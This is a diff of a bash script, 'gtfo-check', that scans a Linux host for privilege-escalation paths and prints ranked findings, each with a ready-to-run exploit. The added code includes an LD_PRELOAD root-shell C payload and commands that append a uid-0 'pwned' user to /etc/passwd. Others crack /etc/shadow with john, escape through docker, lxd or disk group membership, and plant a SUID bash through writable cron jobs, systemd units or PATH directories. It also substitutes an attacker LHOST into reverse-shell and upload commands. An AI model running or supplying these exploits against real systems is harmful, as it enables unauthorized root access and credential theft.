@@ -1827,662 +1827,714 @@ zypper x' ;;
 
 
 # ========== SCAN ==========
-FOUND=0
-FOUND_GTFO=0
-FOUND_OTHER_USER=0
-FOUND_EXTRA=0
+LHOST="${LHOST:-10.10.14.1}"
+VERBOSE=0
+
+for arg in "$@"; do
+    case "$arg" in
+        -v|--verbose) VERBOSE=1 ;;
+        --no-color)   RED=''; GREEN=''; YELLOW=''; CYAN=''; BOLD=''; NC='' ;;
+        -h|--help)
+            cat <<'USAGE'
+gtfo-check — Linux privilege escalation scanner
+
+Usage: gtfo-check.sh [options]
+
+  -v, --verbose   Also print recon context (kernel, mounts, root procs, all caps)
+      --no-color  Disable ANSI colors (for piping to a file)
+  -h, --help      Show this help
+
+Environment:
+  LHOST=10.10.14.1   Attacker IP substituted into reverse-shell / upload commands
+
+Output: findings ranked CRITICAL -> HIGH -> MEDIUM -> INFO, followed by a
+plain copy-paste block containing only the commands.
+USAGE
+            exit 0 ;;
+    esac
+done
+
 ME=$(id -un 2>/dev/null || whoami 2>/dev/null)
 MY_GROUPS=$(id -Gn 2>/dev/null)
+MY_UID=$(id -u 2>/dev/null)
 
-header() { echo -e "\n${BOLD}${CYAN}══════════════════════════════════════════════════════${NC}"; echo -e "${BOLD}${CYAN}  $1${NC}"; echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════${NC}"; }
+# Running as root: every writable-path check trivially matches and buries the
+# output in noise. Report only what is useful for looting/pivoting instead.
+IS_ROOT=0
+[ "$MY_UID" = "0" ] && IS_ROOT=1
 
-show_hit() {
-    local type="$1" path="$2" funcs="$3" extra="$4"
-    echo -e "  ${GREEN}✓${NC} ${BOLD}$(basename "$path")${NC} ${YELLOW}($funcs)${NC}"
-    echo -e "    Path: $path"
-    [ -n "$extra" ] && echo -e "    $extra"
-    FOUND=$((FOUND+1))
+FINDINGS=$(mktemp "${TMPDIR:-/tmp}/gtfo.XXXXXX") || exit 1
+trap 'rm -f "$FINDINGS"' EXIT INT TERM
+
+# ---------- finding store (temp file: survives subshells/pipes) ----------
+_b64() { printf '%s' "$1" | base64 2>/dev/null | tr -d '\n'; }
+_unb64() { printf '%s' "$1" | base64 -d 2>/dev/null || printf '%s' "$1" | base64 -D 2>/dev/null; }
+
+# add_finding SEV "title" "detail" "commands"
+add_finding() {
+    local sev="$1" n
+    case "$sev" in
+        CRIT) n=0 ;;
+        HIGH) n=1 ;;
+        MED)  n=2 ;;
+        *)    n=3; sev=INFO ;;
+    esac
+    printf '%s|%s|%s|%s|%s\n' \
+        "$n" "$sev" "$(_b64 "$2")" "$(_b64 "$3")" "$(_b64 "$4")" >> "$FINDINGS"
 }
 
-show_owner_hit() {
-    local path="$1" owner="$2" group="$3" perms="$4" type="$5"
-    local color="$YELLOW"
-    [ "$owner" = "root" ] && color="$RED"
-    echo -e "  ${color}→${NC} ${BOLD}$(basename "$path")${NC}  runs as ${color}${BOLD}${owner}${NC}:${group} ${CYAN}[$type]${NC}"
-    echo -e "    Path: $path  Perms: $perms"
-    FOUND=$((FOUND+1))
-    FOUND_OTHER_USER=$((FOUND_OTHER_USER+1))
+# Severity from GTFOBins function list
+sev_for_funcs() {
+    case "$1" in
+        *shell*|*privilege-escalation*|*library-load*) echo CRIT ;;
+        *file-write*|*file-read*)                     echo HIGH ;;
+        *)                                            echo MED  ;;
+    esac
 }
 
-show_extra() {
-    local desc="$1" detail="$2" suggestion="$3"
-    echo -e "  ${RED}✗${NC} ${BOLD}${desc}${NC}"
-    [ -n "$detail" ] && echo -e "    ${detail}"
-    if [ -n "$suggestion" ]; then
-        echo -e "    ${CYAN}Suggestion:${NC}"
-        echo "$suggestion" | while IFS= read -r line; do
-            echo -e "      ${GREEN}$line${NC}"
-        done
-    fi
-    FOUND=$((FOUND+1))
-    FOUND_EXTRA=$((FOUND_EXTRA+1))
+# Turn GTFOBins placeholders into runnable commands.
+# The lookup tables are written for `echo -e`, so backslashes are doubled
+# (\\; \\n \\immediate). Unescape once here so both the report and the
+# copy-paste block emit the real command text.
+realize() {
+    local c
+    c=$(printf '%b' "$1")
+    c=${c//\/path\/to\/input-file/\/etc\/shadow}
+    c=${c//\/path\/to\/file-input/\/etc\/shadow}
+    c=${c//\/path\/to\/input/\/etc\/shadow}
+    c=${c//\/path\/to\/output-file/\/tmp\/out}
+    c=${c//\/path\/to\/output-dir\//\/tmp\/}
+    c=${c//\/path\/to\/output-dir/\/tmp}
+    c=${c//\/path\/to\/temp-dir\//\/tmp\/}
+    c=${c//\/path\/to\/temp-dir/\/tmp}
+    c=${c//\/path\/to\/temp-file/\/tmp\/x}
+    c=${c//\/path\/to\/CMakeLists.txt/\/tmp\/CMakeLists.txt}
+    c=${c//\/path\/to\/wordlist/\/tmp\/wordlist}
+    c=${c//\/path\/to\/hash/\/tmp\/hash}
+    c=${c//\/path\/to\/command/\/tmp\/payload.sh}
+    c=${c//\/path\/to\/lib.so/\/tmp\/evil.so}
+    c=${c//\/path\/to\/script.rb/\/tmp\/x.rb}
+    c=${c//\/path\/to\/script.pl/\/tmp\/x.pl}
+    c=${c//\/path\/to\/ld.so/\/lib64\/ld-linux-x86-64.so.2}
+    c=${c//\/path\/to\/dir\//\/tmp\/}
+    c=${c//\/path\/to\//\/tmp\/}
+    c=${c//attacker.com/$LHOST}
+    printf '%s' "$c"
 }
 
-show_exploit() {
-    local code="$1"
-    if [ -n "$code" ]; then
-        echo -e "    ${CYAN}Exploit:${NC}"
-        echo "$code" | while IFS= read -r line; do
-            echo -e "      ${GREEN}$line${NC}"
-        done
-    fi
+# Default SUID/SGID binaries: present on every distro, not privesc by themselves
+is_default_setuid() {
+    case "$1" in
+        su|sudo|sudoedit|mount|umount|passwd|chsh|chfn|newgrp|gpasswd|chage|expiry\
+        |pkexec|polkit-agent-helper-1|dbus-daemon-launch-helper|fusermount|fusermount3\
+        |ping|ping6|traceroute6.iputils|mount.nfs|mount.cifs|ntfs-3g|snap-confine\
+        |unix_chkpwd|pam_timestamp_check|utempter|libexec|ssh-keysign|wall|write\
+        |bsd-write|dotlockfile|crontab|mlocate|locate|postdrop|postqueue|mailq\
+        |sendmail|Xorg.wrap|vmware-user-suid-wrapper|dmcrypt-get-device|exim4) return 0 ;;
+    esac
+    return 1
+}
+
+header() {
+    echo ""
+    echo -e "${BOLD}${CYAN}━━━ $1 ${NC}"
+}
+
+# cap_list MAX <<< "lines"  — truncate a detail list so it never floods the report
+cap_list() {
+    local max="$1" input n
+    input=$(cat)
+    n=$(printf '%s\n' "$input" | grep -c .)
+    printf '%s\n' "$input" | head -n "$max" | sed 's/^/  /'
+    [ "$n" -gt "$max" ] && printf '  ... and %s more\n' "$((n - max))"
 }
 
 # --- Cache heavy scans (each runs ONCE with timeout) ---
-SUID_CACHE=$(timeout 30 find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null)
+SUID_CACHE=$(timeout 30 find / -perm -4000 -type f -not -path "/snap/*" -exec ls -la {} \; 2>/dev/null)
 SGID_CACHE=$(timeout 30 find / -perm -2000 -type f -not -path "/snap/*" -exec ls -la {} \; 2>/dev/null)
 
-# --- SUID ---
-header "SUID Binaries (-perm -4000)"
-echo -e "  ${CYAN}[GTFOBins matches]${NC}"
+# =============================== SUID ===============================
 while IFS= read -r entry; do
     [ -z "$entry" ] && continue
     file=$(echo "$entry" | awk '{print $NF}')
     owner=$(echo "$entry" | awk '{print $3}')
-    group=$(echo "$entry" | awk '{print $4}')
-    perms=$(echo "$entry" | awk '{print $1}')
     b=$(basename "$file")
-    result=$(is_suid_exploitable "$b") && {
-        show_hit "SUID" "$file" "$result" "Owner: ${owner}:${group}"
-        show_exploit "$(get_suid_exploit "$b")"
-        FOUND_GTFO=$((FOUND_GTFO+1))
-    }
+    is_default_setuid "$b" && continue
+    funcs=$(is_suid_exploitable "$b") || continue
+    cmd=$(realize "$(get_suid_exploit "$b")")
+    add_finding "$(sev_for_funcs "$funcs")" \
+        "SUID $b -> runs as $owner" \
+        "$file  ($funcs)" \
+        "$cmd"
 done <<< "$SUID_CACHE"
 
-echo ""
-echo -e "  ${CYAN}[Non-root SUID owners — lateral movement]${NC}"
-while IFS= read -r entry; do
-    [ -z "$entry" ] && continue
-    file=$(echo "$entry" | awk '{print $NF}')
-    owner=$(echo "$entry" | awk '{print $3}')
-    group=$(echo "$entry" | awk '{print $4}')
-    perms=$(echo "$entry" | awk '{print $1}')
-    [ "$owner" = "root" ] && continue
-    [ "$owner" = "$ME" ] && continue
-    show_owner_hit "$file" "$owner" "$group" "$perms" "SUID"
-done <<< "$SUID_CACHE"
-
-# --- SGID ---
-header "SGID Binaries (-perm -2000)"
-echo -e "  ${CYAN}[GTFOBins matches]${NC}"
-while IFS= read -r entry; do
-    [ -z "$entry" ] && continue
-    file=$(echo "$entry" | awk '{print $NF}')
-    owner=$(echo "$entry" | awk '{print $3}')
-    group=$(echo "$entry" | awk '{print $4}')
-    perms=$(echo "$entry" | awk '{print $1}')
-    b=$(basename "$file")
-    result=$(is_suid_exploitable "$b") && {
-        show_hit "SGID" "$file" "$result" "Group: ${group}"
-        show_exploit "$(get_suid_exploit "$b")"
-        FOUND_GTFO=$((FOUND_GTFO+1))
-    }
-done <<< "$SGID_CACHE"
-
-echo ""
-echo -e "  ${CYAN}[SGID with groups you're not in — lateral movement]${NC}"
-while IFS= read -r entry; do
-    [ -z "$entry" ] && continue
-    file=$(echo "$entry" | awk '{print $NF}')
-    owner=$(echo "$entry" | awk '{print $3}')
-    group=$(echo "$entry" | awk '{print $4}')
-    perms=$(echo "$entry" | awk '{print $1}')
-    echo "$MY_GROUPS" | grep -qw "$group" && continue
-    show_owner_hit "$file" "$owner" "$group" "$perms" "SGID→$group"
-done <<< "$SGID_CACHE"
-
-# --- Writable files owned by other users (scoped to useful dirs, with timeout) ---
-WRITABLE_CACHE=$(timeout 30 find /etc /opt /var /usr/local /home /root /tmp /srv \
-    -writable -type f ! -user "$ME" \
-    ! -path "/var/lib/*" ! -path "/var/cache/*" ! -path "/var/log/*" \
-    -exec ls -la {} \; 2>/dev/null)
-if [ -n "$WRITABLE_CACHE" ]; then
-    header "Writable Files Owned by Other Users"
-    WRITABLE_COUNT=0
-    while IFS= read -r entry; do
-        [ -z "$entry" ] && continue
-        file=$(echo "$entry" | awk '{print $NF}')
-        owner=$(echo "$entry" | awk '{print $3}')
-        group=$(echo "$entry" | awk '{print $4}')
-        perms=$(echo "$entry" | awk '{print $1}')
-        [ "$owner" = "$ME" ] && continue
-        echo -e "  ${YELLOW}→${NC} ${BOLD}$(basename "$file")${NC}  owned by ${YELLOW}${BOLD}${owner}${NC}:${group}"
-        echo -e "    Path: $file  Perms: $perms"
-        WRITABLE_COUNT=$((WRITABLE_COUNT+1))
-        FOUND=$((FOUND+1))
-        [ "$WRITABLE_COUNT" -ge 30 ] && echo -e "  ${YELLOW}... (max 30 shown)${NC}" && break
-    done <<< "$WRITABLE_CACHE"
+# SUID owned by a non-root user = lateral movement, grouped into one finding
+SUID_LATERAL=$(echo "$SUID_CACHE" | awk -v me="$ME" '$3!="root" && $3!=me && NF>0 {print "  "$3":"$4"  "$NF}')
+if [ -n "$SUID_LATERAL" ]; then
+    add_finding MED "SUID binaries owned by other users (lateral movement)" \
+        "$(printf '%s' "$SUID_LATERAL" | sed 's/^  //' | cap_list 10)" ""
 fi
 
-# --- Capabilities ---
+# =============================== SGID ===============================
+while IFS= read -r entry; do
+    [ -z "$entry" ] && continue
+    file=$(echo "$entry" | awk '{print $NF}')
+    group=$(echo "$entry" | awk '{print $4}')
+    b=$(basename "$file")
+    is_default_setuid "$b" && continue
+    funcs=$(is_suid_exploitable "$b") || continue
+    cmd=$(realize "$(get_suid_exploit "$b")")
+    add_finding "$(sev_for_funcs "$funcs")" \
+        "SGID $b -> runs as group $group" \
+        "$file  ($funcs)" \
+        "$cmd"
+done <<< "$SGID_CACHE"
+
+# =========================== CAPABILITIES ===========================
+CAP_OUTPUT=""
 if command -v getcap &>/dev/null; then
     CAP_OUTPUT=$(timeout 20 getcap -r / 2>/dev/null | grep -v '/snap/')
-    if [ -n "$CAP_OUTPUT" ]; then
-        header "Capabilities (getcap)"
-        echo -e "  ${CYAN}[GTFOBins matches]${NC}"
-        while IFS= read -r line; do
-            [ -z "$line" ] && continue
-            file=$(echo "$line" | awk '{print $1}')
-            caps=$(echo "$line" | sed 's/^.* = //')
-            b=$(basename "$file")
-            result=$(is_cap_exploitable "$b") && {
-                show_hit "CAP" "$file" "${result%%|*}" "Caps: $caps"
-                show_exploit "$(get_cap_exploit "$b")"
-                FOUND_GTFO=$((FOUND_GTFO+1))
-            }
-        done <<< "$CAP_OUTPUT"
-
-        echo ""
-        echo -e "  ${CYAN}[All capabilities]${NC}"
-        while IFS= read -r line; do
-            [ -z "$line" ] && continue
-            file=$(echo "$line" | awk '{print $1}')
-            caps=$(echo "$line" | sed 's/^.* = //')
-            owner=$(stat -c '%U:%G' "$file" 2>/dev/null || stat -f '%Su:%Sg' "$file" 2>/dev/null)
-            echo -e "  ${YELLOW}•${NC} $(basename "$file")  ${CYAN}$caps${NC}  owner: $owner"
-            echo -e "    Path: $file"
-        done <<< "$CAP_OUTPUT"
-    fi
-fi
-
-# --- Sudo ---
-SUDO_OUTPUT=""
-SUDO_OUTPUT=$(sudo -n -l 2>/dev/null)
-if [ $? -ne 0 ] || [ -z "$SUDO_OUTPUT" ]; then
-    SUDO_OUTPUT=$(echo "" | sudo -S -l 2>/dev/null)
-fi
-
-SUDO_HAS_FINDINGS=false
-# Check if we have anything to show
-[ -r /etc/sudoers ] && SUDO_HAS_FINDINGS=true
-ls -la /etc/sudoers.d/ 2>/dev/null | grep -q "^-..r" && SUDO_HAS_FINDINGS=true
-echo "$SUDO_OUTPUT" | grep -q "/" && SUDO_HAS_FINDINGS=true
-
-if [ "$SUDO_HAS_FINDINGS" = true ]; then
-    header "Sudo Permissions"
-    if [ -r /etc/sudoers ]; then
-        echo -e "  ${GREEN}/etc/sudoers is readable!${NC}"
-        grep -v '^#' /etc/sudoers 2>/dev/null | grep -v '^$' | while IFS= read -r line; do
-            echo -e "  $line"
-        done
-        echo ""
-    fi
-    if [ -d /etc/sudoers.d ] && ls -la /etc/sudoers.d/ 2>/dev/null | grep -q "^-..r"; then
-        echo -e "  ${GREEN}/etc/sudoers.d/ has readable files:${NC}"
-        for sf in /etc/sudoers.d/*; do
-            [ -r "$sf" ] || continue
-            echo -e "  ${CYAN}--- $(basename "$sf") ---${NC}"
-            grep -v '^#' "$sf" 2>/dev/null | grep -v '^$' | while IFS= read -r line; do
-                echo -e "  $line"
-            done
-        done
-        echo ""
-    fi
-    if echo "$SUDO_OUTPUT" | grep -q "/"; then
-        echo -e "  ${CYAN}[sudo -l output]${NC}"
-        echo "$SUDO_OUTPUT" | while IFS= read -r line; do
-            echo -e "  $line"
-        done
-        echo ""
-        echo -e "  ${CYAN}[GTFOBins matches]${NC}"
-        echo "$SUDO_OUTPUT" | grep -E '^\s+/' | while IFS= read -r line; do
-            [ -z "$line" ] && continue
-            bin_path=$(echo "$line" | sed -n 's/.*\(\/[^ ]*\).*/\1/p' | head -1)
-            [ -z "$bin_path" ] && continue
-            b=$(basename "$bin_path")
-            result=$(is_sudo_exploitable "$b") && {
-                show_hit "SUDO" "$bin_path" "$result" "Rule: $line"
-                show_exploit "$(get_sudo_exploit "$b")"
-                FOUND_GTFO=$((FOUND_GTFO+1))
-            }
-        done
-    fi
-fi
-
-# ==============================================================================
-# EXTENDED PRIVILEGE ESCALATION CHECKS
-# Sections only appear when there are actual findings.
-# ==============================================================================
-
-# --- Writable cron scripts (exploitable) ---
-CRON_WRITABLE=""
-for crontab_file in /etc/crontab /etc/cron.d/*; do
-    [ -r "$crontab_file" ] || continue
     while IFS= read -r line; do
-        script_path=$(echo "$line" | grep -oP '(/[^\s;|&>]+)' | head -1)
-        [ -n "$script_path" ] && [ -w "$script_path" ] 2>/dev/null && CRON_WRITABLE="${CRON_WRITABLE}${script_path}|${crontab_file}\n"
-    done < <(grep -v '^#' "$crontab_file" 2>/dev/null | grep -v '^$' | grep -v '^[[:space:]]*$')
-done
-for crondir in /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
-    [ -d "$crondir" ] || continue
-    for script in "$crondir"/*; do
-        [ -f "$script" ] && [ -w "$script" ] && CRON_WRITABLE="${CRON_WRITABLE}${script}|${crondir}\n"
-    done
-done
-if [ -n "$CRON_WRITABLE" ]; then
-    header "Writable Cron Scripts"
-    echo -e "$CRON_WRITABLE" | while IFS='|' read -r path src; do
-        [ -z "$path" ] && continue
-        show_extra "Writable: $path" "Source: $src" "# Inject payload into $path"
-    done
+        [ -z "$line" ] && continue
+        file=$(echo "$line" | awk '{print $1}')
+        caps=$(echo "$line" | sed 's/^.* = //')
+        b=$(basename "$file")
+        funcs=$(is_cap_exploitable "$b") || continue
+        cmd=$(realize "$(get_cap_exploit "$b")")
+        add_finding CRIT "CAP $b has $caps" "$file" "$cmd"
+    done <<< "$CAP_OUTPUT"
+
+    # cap_setuid / cap_dac_read_search on anything = root, even without a GTFOBins entry
+    while IFS= read -r line; do
+        [ -z "$line" ] && continue
+        file=$(echo "$line" | awk '{print $1}')
+        caps=$(echo "$line" | sed 's/^.* = //')
+        b=$(basename "$file")
+        is_cap_exploitable "$b" >/dev/null && continue
+        case "$caps" in
+            *cap_setuid*|*cap_dac_read_search*|*cap_dac_override*|*cap_sys_admin*|*cap_sys_ptrace*)
+                add_finding HIGH "CAP $b has $caps (no GTFOBins recipe)" \
+                    "$file" "# Dangerous capability — check how $b uses it" ;;
+        esac
+    done <<< "$CAP_OUTPUT"
 fi
 
-# --- Readable crontabs of OTHER users ---
+# =============================== SUDO ===============================
+SUDO_OUTPUT=$(sudo -n -l 2>/dev/null)
+[ -z "$SUDO_OUTPUT" ] && SUDO_OUTPUT=$(echo "" | sudo -S -l 2>/dev/null)
+
+if echo "$SUDO_OUTPUT" | grep -qE '\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL'; then
+    add_finding CRIT "sudo: full ALL=(ALL) ALL access" \
+        "$(echo "$SUDO_OUTPUT" | grep -E '\(ALL' | head -3)" \
+        "sudo su -"
+fi
+
+echo "$SUDO_OUTPUT" | grep -E '^\s+\(' | while IFS= read -r line; do
+    [ -z "$line" ] && continue
+    echo "$line" | grep -qE '\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL\s*$' && continue
+    runas=$(echo "$line" | sed -n 's/^[[:space:]]*(\([^)]*\)).*/\1/p')
+    nopass=""
+    echo "$line" | grep -q 'NOPASSWD' && nopass=" [NOPASSWD]"
+    # every absolute path on the rule line can be a separate allowed binary
+    for bin_path in $(echo "$line" | tr ',' ' ' | tr -s ' ' '\n' | grep '^/'); do
+        b=$(basename "$bin_path")
+        funcs=$(is_sudo_exploitable "$b") || continue
+        cmd="sudo $(realize "$(get_sudo_exploit "$b")")"
+        [ -n "$runas" ] && [ "$runas" != "root" ] && cmd="sudo -u ${runas%%:*} $(realize "$(get_sudo_exploit "$b")")"
+        add_finding "$(sev_for_funcs "$funcs")" \
+            "sudo $b as ${runas:-root}$nopass" \
+            "$bin_path  ($funcs)" \
+            "$cmd"
+    done
+done
+
+# sudo env_keep LD_PRELOAD = root
+if echo "$SUDO_OUTPUT" | grep -qi 'env_keep.*LD_PRELOAD\|env_keep.*LD_LIBRARY_PATH'; then
+    add_finding CRIT "sudo preserves LD_PRELOAD / LD_LIBRARY_PATH" \
+        "Library injection into any sudo-allowed binary" \
+        "cat >/tmp/pe.c <<'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); }
+EOF
+gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
+sudo LD_PRELOAD=/tmp/pe.so <any-allowed-binary>"
+fi
+
+# readable sudoers
+if [ -r /etc/sudoers ]; then
+    add_finding INFO "/etc/sudoers is readable" \
+        "$(grep -vE '^\s*#|^\s*$' /etc/sudoers 2>/dev/null | head -10)" \
+        "cat /etc/sudoers"
+fi
+
+# ========================= PASSWD / SHADOW =========================
+if [ "$IS_ROOT" -eq 0 ]; then
+[ -w /etc/passwd ] && add_finding CRIT "/etc/passwd is WRITABLE" \
+    "Append a uid-0 user with a known password" \
+    "openssl passwd -1 -salt x pwned
+# paste the hash below:
+echo 'pwned:\$1\$x\$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
+su pwned   # password: pwned"
+
+[ -r /etc/shadow ] && add_finding CRIT "/etc/shadow is READABLE" \
+    "Crack hashes offline" \
+    "cat /etc/shadow
+unshadow /etc/passwd /etc/shadow > /tmp/unshadowed
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed"
+
+[ -w /etc/shadow ] && add_finding CRIT "/etc/shadow is WRITABLE" \
+    "Overwrite root's hash directly" \
+    "openssl passwd -6 -salt x pwned
+# replace root's 2nd field in /etc/shadow with that hash, then:
+su root   # password: pwned"
+fi
+
+EMPTY_PW=$(awk -F: '($2 == "") {print $1}' /etc/passwd 2>/dev/null)
+[ -n "$EMPTY_PW" ] && add_finding CRIT "Users with an empty password" "$EMPTY_PW" \
+    "su - $(echo "$EMPTY_PW" | head -1)"
+
+HASH_IN_PASSWD=$(awk -F: '($2 != "x" && $2 != "*" && $2 != "!" && $2 != "!!" && $2 != "") {print $1 ":" $2}' /etc/passwd 2>/dev/null)
+[ -n "$HASH_IN_PASSWD" ] && add_finding HIGH "Password hashes stored in /etc/passwd" "$HASH_IN_PASSWD" \
+    "echo '$(echo "$HASH_IN_PASSWD" | head -1)' > /tmp/h
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/h"
+
+# ======================= GROUP MEMBERSHIPS =========================
+for grp in docker lxd lxc disk shadow adm video sudo wheel; do
+    echo "$MY_GROUPS" | grep -qw "$grp" || continue
+    case "$grp" in
+        docker) add_finding CRIT "Member of group 'docker' = root" \
+            "The docker socket mounts the host filesystem" \
+            "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh" ;;
+        lxd|lxc) add_finding CRIT "Member of group '$grp' = root" \
+            "Privileged container with the host disk mounted" \
+            "lxc init ubuntu:18.04 pwn -c security.privileged=true
+lxc config device add pwn host disk source=/ path=/mnt/root recursive=true
+lxc start pwn
+lxc exec pwn /bin/sh
+# then: chroot /mnt/root" ;;
+        disk) add_finding CRIT "Member of group 'disk' = root" \
+            "Raw block-device access bypasses file permissions" \
+            "df -h /    # find the device, e.g. /dev/sda1
+debugfs /dev/sda1
+# at the debugfs prompt:  cat /etc/shadow" ;;
+        shadow) add_finding HIGH "Member of group 'shadow'" \
+            "Read password hashes" \
+            "cat /etc/shadow
+unshadow /etc/passwd /etc/shadow > /tmp/unshadowed
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed" ;;
+        adm) add_finding MED "Member of group 'adm'" \
+            "Read system logs — harvest credentials" \
+            "grep -rniE 'passw|secret|token|api[_-]?key' /var/log/ 2>/dev/null | head -40" ;;
+        video) add_finding MED "Member of group 'video'" \
+            "Capture the console framebuffer" \
+            "cat /dev/fb0 > /tmp/screen.raw
+# width x height:
+cat /sys/class/graphics/fb0/virtual_size" ;;
+        sudo|wheel) add_finding INFO "Member of group '$grp'" \
+            "Password-based sudo likely available" \
+            "sudo -l" ;;
+    esac
+done
+
+# ===================== WRITABLE CRON / SYSTEMD =====================
+CRON_W=""
+if [ "$IS_ROOT" -eq 0 ]; then
+    for crontab_file in /etc/crontab /etc/cron.d/*; do
+        [ -r "$crontab_file" ] || continue
+        while IFS= read -r line; do
+            for script_path in $(echo "$line" | tr ' \t' '\n' | grep '^/'); do
+                [ -w "$script_path" ] 2>/dev/null || continue
+                CRON_W="${CRON_W}${script_path}
+"
+            done
+        done < <(grep -vE '^\s*#|^\s*$' "$crontab_file" 2>/dev/null)
+    done
+    for crondir in /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
+        [ -d "$crondir" ] || continue
+        for script in "$crondir"/*; do
+            [ -f "$script" ] && [ -w "$script" ] || continue
+            CRON_W="${CRON_W}${script}
+"
+        done
+    done
+fi
+CRON_W=$(printf '%s' "$CRON_W" | grep -v '^$' | sort -u)
+if [ -n "$CRON_W" ]; then
+    TARGET=$(echo "$CRON_W" | head -1)
+    add_finding CRIT "Writable script executed by cron (as root)" \
+        "$(echo "$CRON_W" | cap_list 8)" \
+        "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $TARGET
+# wait for the cron interval to fire, then:
+/tmp/rootbash -p"
+fi
+
 CRON_OTHER=""
 for cronbase in /var/spool/cron/crontabs /var/spool/cron; do
     [ -d "$cronbase" ] || continue
     for uc in "$cronbase"/*; do
-        [ -f "$uc" ] || continue
-        uc_owner=$(basename "$uc")
-        [ "$uc_owner" = "$ME" ] && continue
-        [ -r "$uc" ] && CRON_OTHER="${CRON_OTHER}${uc}|${uc_owner}\n"
+        [ -f "$uc" ] && [ -r "$uc" ] || continue
+        [ "$(basename "$uc")" = "$ME" ] && continue
+        CRON_OTHER="${CRON_OTHER}  $uc:
+$(grep -vE '^\s*#|^\s*$' "$uc" 2>/dev/null | sed 's/^/    /')
+"
     done
 done
-if [ -n "$CRON_OTHER" ]; then
-    header "Readable Crontabs (other users)"
-    echo -e "$CRON_OTHER" | while IFS='|' read -r path owner; do
-        [ -z "$path" ] && continue
-        echo -e "  ${GREEN}✓${NC} ${BOLD}User '$owner':${NC} $path"
-        grep -v '^#' "$path" 2>/dev/null | grep -v '^$' | while IFS= read -r line; do
-            echo -e "    $line"
-        done
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
+[ -n "$CRON_OTHER" ] && add_finding MED "Readable crontabs of other users" "$CRON_OTHER" ""
+
+SVC_W=""
+if [ "$IS_ROOT" -eq 0 ]; then
+    for svcdir in /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system /run/systemd/system; do
+        [ -d "$svcdir" ] || continue
+        while IFS= read -r svc; do
+            [ -n "$svc" ] && [ -w "$svc" ] || continue
+            SVC_W="${SVC_W}${svc}
+"
+        done < <(find "$svcdir" -maxdepth 1 -name '*.service' -type f 2>/dev/null)
     done
 fi
+SVC_W=$(printf '%s' "$SVC_W" | grep -v '^$' | sort -u)
+if [ -n "$SVC_W" ]; then
+    SVC_N=$(echo "$SVC_W" | wc -l | tr -d ' ')
+    TARGET=$(echo "$SVC_W" | head -1)
+    add_finding CRIT "Writable systemd unit file ($SVC_N found)" \
+        "$(echo "$SVC_W" | head -8 | sed 's/^/  /')$([ "$SVC_N" -gt 8 ] && printf '\n  ... and %s more' "$((SVC_N-8))")" \
+        "sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\"|' $TARGET
+sudo systemctl daemon-reload
+sudo systemctl restart $(basename "$TARGET" .service)
+/tmp/rootbash -p"
+fi
 
-# --- Writable PATH directories ---
-PATH_HITS=""
-IFS=':' read -ra DIRS <<< "$PATH"
-for dir in "${DIRS[@]}"; do
-    [ -d "$dir" ] && [ -w "$dir" ] && PATH_HITS="${PATH_HITS} ${dir}"
+# ===================== WRITABLE PATH / LD / ETC ====================
+if [ "$IS_ROOT" -eq 0 ]; then
+IFS=':' read -ra PDIRS <<< "$PATH"
+for dir in "${PDIRS[@]}"; do
+    [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ] || continue
+    add_finding HIGH "Writable PATH directory: $dir" \
+        "Hijack any unqualified command run by root (cron, services)" \
+        "printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > $dir/<CMD>
+chmod +x $dir/<CMD>
+# once root runs <CMD>:
+/tmp/rootbash -p"
 done
-if [ -n "$PATH_HITS" ]; then
-    header "Writable PATH Directories"
-    for dir in $PATH_HITS; do
-        show_extra "Writable: $dir" "Cron/services with unqualified commands can be hijacked" "echo '#!/bin/bash\n/bin/sh' > $dir/TARGET && chmod +x $dir/TARGET"
-    done
+
+if [ -w /etc/ld.so.preload ] 2>/dev/null; then
+    add_finding CRIT "/etc/ld.so.preload is writable" "Global library preload = root on next command" \
+        "cat >/tmp/pe.c <<'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); }
+EOF
+gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
+echo /tmp/pe.so > /etc/ld.so.preload"
+elif [ ! -e /etc/ld.so.preload ] && [ -w /etc ] 2>/dev/null; then
+    add_finding CRIT "/etc is writable — can create /etc/ld.so.preload" "Global library preload" \
+        "echo /tmp/pe.so > /etc/ld.so.preload"
 fi
 
-# --- Interesting group memberships ---
-GROUP_HITS=""
-for grp in docker lxd lxc disk adm video shadow; do
-    id -nG 2>/dev/null | grep -qw "$grp" && GROUP_HITS="${GROUP_HITS} ${grp}"
-done
-if [ -n "$GROUP_HITS" ]; then
-    header "Exploitable Group Memberships"
-    for grp in $GROUP_HITS; do
-        case "$grp" in
-            docker)  show_extra "Member of 'docker'" "Full root access" "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh" ;;
-            lxd|lxc) show_extra "Member of '$grp'" "Full root access via containers" "# See: https://github.com/h050sh/LXD-privesc" ;;
-            disk)    show_extra "Member of 'disk'" "Raw disk read — read /etc/shadow" "debugfs /dev/sda1\ncat /etc/shadow" ;;
